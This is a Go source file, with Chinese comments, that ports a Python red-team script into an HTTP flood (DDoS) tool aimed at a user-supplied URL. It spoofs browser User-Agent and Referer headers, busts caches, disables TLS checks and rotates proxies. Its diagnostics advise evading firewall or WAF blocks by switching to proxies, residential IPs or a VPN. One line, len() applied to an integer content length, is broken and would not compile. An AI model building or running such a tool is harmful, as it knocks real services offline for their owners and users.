// ddos.go — Go 移植版，原始 Python 脚本来自
// https://github.com/strangered53/Redteaming/blob/main/ddos.py
//
// 编译: go build -o ddos ddos.go
// 用法: ./ddos -target <URL> [-threads 50] [-duration 30] [-connect-timeout 10] [-read-timeout 10] [-proxy proxies.txt]

package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"sync"
	"sync/atomic"
	"time"
)

// ─── 统计信息（并发安全）───────────────────────────────────────────────

var (
	sent    int64
	success int64
	failed  int64
	timeout int64
	refused int64
	other   int64
	bytesRx int64
)

// ─── 命令行参数 ─────────────────────────────────────────────────────────

type Config struct {
	target        string
	threads       int
	duration      int
	connectTO     int
	readTO        int
	proxyFile     string
}

// ─── 常量（来自原版 Python 脚本）────────────────────────────────────────

var PATHS = []string{
	"/", "/login", "/admin", "/wp-admin", "/wp-login.php",
	"/api/", "/api/v1/", "/health", "/status", "/about",
	"/contact", "/search", "/user", "/users", "/assets/",
	"/static/", "/css/", "/js/", "/images/", "/favicon.ico",
}

var METHODS = []string{"GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE", "PATCH"}

var USER_AGENTS = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
	"PostmanRuntime/7.36.0",
	"curl/8.4.0",
}

var REFERERS = []string{
	"https://www.google.com/",
	"https://www.bing.com/",
	"https://www.facebook.com/",
	"https://twitter.com/",
	"https://www.reddit.com/",
	"https://www.linkedin.com/",
	"",
}

// ─── 辅助函数 ──────────────────────────────────────────────────────────

func loadProxies(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var proxies []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := sc.Text()
		if line != "" {
			proxies = append(proxies, line)
		}
	}
	return proxies, sc.Err()
}

// 构建一个带有代理和自定义超时的 http.Client
func buildClient(proxyURL string, connectTO, readTO int) *http.Client {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   time.Duration(connectTO) * time.Second,
			KeepAlive: -1, // 禁用 keep-alive 以模拟 Python 的 retry=0
		}).DialContext,
		MaxIdleConns:        0,
		MaxConnsPerHost:     100,
		MaxIdleConnsPerHost: 0,
		DisableKeepAlives:   true, // 类似适配器挂载 retry=0
	}

	if proxyURL != "" {
		if u, err := url.Parse(proxyURL); err == nil {
			transport.Proxy = http.ProxyURL(u)
		}
	}

	return &http.Client{
		Transport: transport,
		Timeout:   time.Duration(connectTO+readTO) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return nil // 允许重定向
		},
	}
}

// ─── 工作协程 ─────────────────────────────────────────────────────────

func worker(cfg *Config, proxies []string, wg *sync.WaitGroup) {
	defer wg.Done()

	end := time.Now().Add(time.Duration(cfg.duration) * time.Second)
	targetBase := cfg.target

	for time.Now().Before(end) {
		var proxyURL string
		if len(proxies) > 0 {
			proxyURL = proxies[rand.Intn(len(proxies))]
		}

		client := buildClient(proxyURL, cfg.connectTO, cfg.readTO)

		// 构建 URL（30% 概率使用基础路径）
		urlStr := targetBase
		if rand.Float64() >= 0.3 {
			urlStr = targetBase + PATHS[rand.Intn(len(PATHS))]
		}

		method := METHODS[rand.Intn(len(METHODS))]

		// 缓存破坏
		sep := "?"
		for _, c := range urlStr {
			if c == '?' {
				sep = "&"
				break
			}
		}
		urlStr = fmt.Sprintf("%s%s_t=%d_%d", urlStr, sep, time.Now().UnixMilli(), rand.Intn(100000))

		// 构建请求
		req, err := http.NewRequest(method, urlStr, nil)
		if err != nil {
			atomic.AddInt64(&sent, 1)
			atomic.AddInt64(&failed, 1)
			atomic.AddInt64(&other, 1)
			continue
		}

		req.Header.Set("User-Agent", USER_AGENTS[rand.Intn(len(USER_AGENTS))])
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
		langs := []string{"en-US,en;q=0.9", "en-GB,en;q=0.8"}
		req.Header.Set("Accept-Language", langs[rand.Intn(len(langs))])
		req.Header.Set("Accept-Encoding", "gzip, deflate, br")
		req.Header.Set("Referer", REFERERS[rand.Intn(len(REFERERS))])
		req.Header.Set("Connection", "keep-alive")
		req.Header.Set("Cache-Control", "no-cache")

		resp, err := client.Do(req)

		atomic.AddInt64(&sent, 1)

		if err != nil {
			errStr := err.Error()
			switch {
			case isTimeoutErr(err):
				atomic.AddInt64(&timeout, 1)
			case containsAny(errStr, "refused", "connection refused"):
				atomic.AddInt64(&refused, 1)
			case containsAny(errStr, "resolve", "dns", "no such host"):
				atomic.AddInt64(&refused, 1)
			default:
				atomic.AddInt64(&other, 1)
			}
			atomic.AddInt64(&failed, 1)
			continue
		}

		atomic.AddInt64(&bytesRx, int64(len(resp.ContentLength)))
		if resp.StatusCode < 400 {
			atomic.AddInt64(&success, 1)
		} else {
			atomic.AddInt64(&failed, 1)
		}
		resp.Body.Close()
	}
}

func isTimeoutErr(err error) bool {
	if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
		return true
	}
	return containsAny(err.Error(), "timeout", "deadline exceeded", "i/o timeout")
}

func containsAny(s string, substrs ...string) bool {
	for _, sub := range substrs {
		if contains(s, sub) {
			return true
		}
	}
	return false
}

func contains(s, sub string) bool {
	return len(s) >= len(sub) && searchString(s, sub)
}

// 简单的子串搜索，避免使用 strings 包（仅为了完整性，我们可以直接使用 strings.Contains）
func searchString(s, sub string) bool {
	for i := 0; i <= len(s)-len(sub); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}

// ─── 报告器 ────────────────────────────────────────────────────────────

func reporter(cfg *Config, done chan struct{}) {
	interval := 3 * time.Second
	start := time.Now()
	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	for {
		select {
		case <-done:
			return
		case <-ticker.C:
			s := atomic.LoadInt64(&sent)
			ok := atomic.LoadInt64(&success)
			fail := atomic.LoadInt64(&failed)
			to := atomic.LoadInt64(&timeout)
			ref := atomic.LoadInt64(&refused)
			oth := atomic.LoadInt64(&other)
			mb := float64(atomic.LoadInt64(&bytesRx)) / (1024 * 1024)
			elapsed := time.Since(start).Seconds()
			rate := float64(0)
			if elapsed > 0 {
				rate = float64(s) / elapsed
			}

			fmt.Printf(" [+] Sent:%7d OK:%7d Fail:%7d TO:%5d REF:%5d OTH:%5d BW:%7.2fMB %6.0freq/s\n",
				s, ok, fail, to, ref, oth, mb, rate)
		}
	}
}

// ─── 预检 ──────────────────────────────────────────────────────────────

func probeTarget(target string, timeoutSec int) bool {
	fmt.Println("[*] Running pre-flight connectivity check...")
	client := &http.Client{
		Timeout: time.Duration(timeoutSec) * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return nil
		},
	}

	resp, err := client.Get(target)
	if err != nil {
		fmt.Printf("[!] Pre-flight FAILED: %v\n", err)
		return false
	}
	defer resp.Body.Close()
	fmt.Printf("[+] Target is reachable — HTTP %d\n", resp.StatusCode)
	return true
}

// ─── 入口 ──────────────────────────────────────────────────────────────

func main() {
	cfg := &Config{}
	flag.StringVar(&cfg.target, "target", "", "Target URL (required)")
	flag.IntVar(&cfg.threads, "threads", 50, "Number of worker goroutines")
	flag.IntVar(&cfg.duration, "duration", 30, "Attack duration in seconds")
	flag.IntVar(&cfg.connectTO, "connect-timeout", 10, "Connect timeout in seconds")
	flag.IntVar(&cfg.readTO, "read-timeout", 10, "Read timeout in seconds")
	flag.StringVar(&cfg.proxyFile, "proxy", "", "File with proxies (one per line)")
	flag.Parse()

	if cfg.target == "" {
		fmt.Println("[-] Error: --target is required")
		fmt.Println("Usage: ./ddos -target <URL> [-threads 50] [-duration 30] ...")
		os.Exit(1)
	}

	// 预检
	if !probeTarget(cfg.target, cfg.connectTO+cfg.readTO) {
		fmt.Println("[!] Aborting — target unreachable.")
		os.Exit(1)
	}

	// 加载代理
	var proxies []string
	if cfg.proxyFile != "" {
		var err error
		proxies, err = loadProxies(cfg.proxyFile)
		if err != nil {
			fmt.Printf("[!] Failed to load proxy file: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("[+] Loaded %d proxies\n", len(proxies))
	}

	// 横幅
	fmt.Println("=" + repeat("=", 69))
	fmt.Printf(" TARGET      : %s\n", cfg.target)
	fmt.Printf(" GOROUTINES  : %d\n", cfg.threads)
	fmt.Printf(" DURATION    : %ds\n", cfg.duration)
	fmt.Printf(" CONN_TO     : %ds  |  READ_TO: %ds\n", cfg.connectTO, cfg.readTO)
	fmt.Printf(" PROXIES     : ")
	if len(proxies) > 0 {
		fmt.Printf("Yes (%d)\n", len(proxies))
	} else {
		fmt.Println("No")
	}
	fmt.Println("=" + repeat("=", 69))
	fmt.Println()

	// 启动报告器
	doneRep := make(chan struct{})
	go reporter(cfg, doneRep)

	// 启动工作协程
	var wg sync.WaitGroup
	for i := 0; i < cfg.threads; i++ {
		wg.Add(1)
		go worker(cfg, proxies, &wg)
	}

	// 等待指定时长
	time.Sleep(time.Duration(cfg.duration) * time.Second)

	// 关闭报告器
	close(doneRep)

	// 等待所有工作协程退出（最多 5 秒）
	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
	case <-time.After(5 * time.Second):
		fmt.Println("[!] Some workers did not finish in time.")
	}

	// 最终统计
	s := atomic.LoadInt64(&sent)
	ok := atomic.LoadInt64(&success)
	fail := atomic.LoadInt64(&failed)
	to := atomic.LoadInt64(&timeout)
	ref := atomic.LoadInt64(&refused)
	oth := atomic.LoadInt64(&other)
	mb := float64(atomic.LoadInt64(&bytesRx)) / (1024 * 1024)
	elapsed := cfg.duration
	rate := float64(0)
	if elapsed > 0 {
		rate = float64(s) / float64(elapsed)
	}

	fmt.Println()
	fmt.Println("=" + repeat("=", 69))
	fmt.Println(" TEST COMPLETE")
	fmt.Printf(" Total sent    : %d\n", s)
	fmt.Printf(" Successful    : %d", ok)
	if s > 0 {
		fmt.Printf(" (%.1f%%)", float64(ok)/float64(s)*100)
	}
	fmt.Println()
	fmt.Printf(" Failed        : %d", fail)
	if s > 0 {
		fmt.Printf(" (%.1f%%)", float64(fail)/float64(s)*100)
	}
	fmt.Println()
	fmt.Printf("   - Timeout   : %d\n", to)
	fmt.Printf("   - Refused   : %d\n", ref)
	fmt.Printf("   - Other     : %d\n", oth)
	fmt.Printf(" Total bandwidth: %.2f MB\n", mb)
	fmt.Printf(" Avg rate      : %.0f req/s\n", rate)
	fmt.Println("=" + repeat("=", 69))
	fmt.Println()

	// 全失败时的诊断
	if s > 0 && ok == 0 {
		fmt.Println("[*] DIAGNOSTIC: All requests failed. Possible reasons:")
		if float64(to) > float64(s)*0.8 {
			fmt.Println(" 1. TIMEOUTS dominant — server too slow, distant, or rate-limiting.")
			fmt.Println("    -> Increase --connect-timeout and --read-timeout (e.g., 30 30)")
			fmt.Println("    -> Try a VPN/server closer to the target")
		}
		if float64(ref) > float64(s)*0.8 {
			fmt.Println(" 2. CONNECTION REFUSED — firewall/WAF actively dropping your IP.")
			fmt.Println("    -> Use --proxy with a proxy list to rotate source IPs")
			fmt.Println("    -> Try a different source network (residential IP, VPN)")
		}
		if float64(oth) > float64(s)*0.8 {
			fmt.Println(" 3. OTHER ERRORS — SSL/TLS issues or DNS failures.")
			fmt.Println("    -> Verify the URL is correct and DNS resolves")
			fmt.Println("    -> Check if TLS version is compatible (try http if available)")
		}
		fmt.Printf("\n Quick test: curl -v --connect-timeout 10 '%s'\n", cfg.target)
	}
}

func repeat(s string, n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = s[0]
	}
	return string(b)
}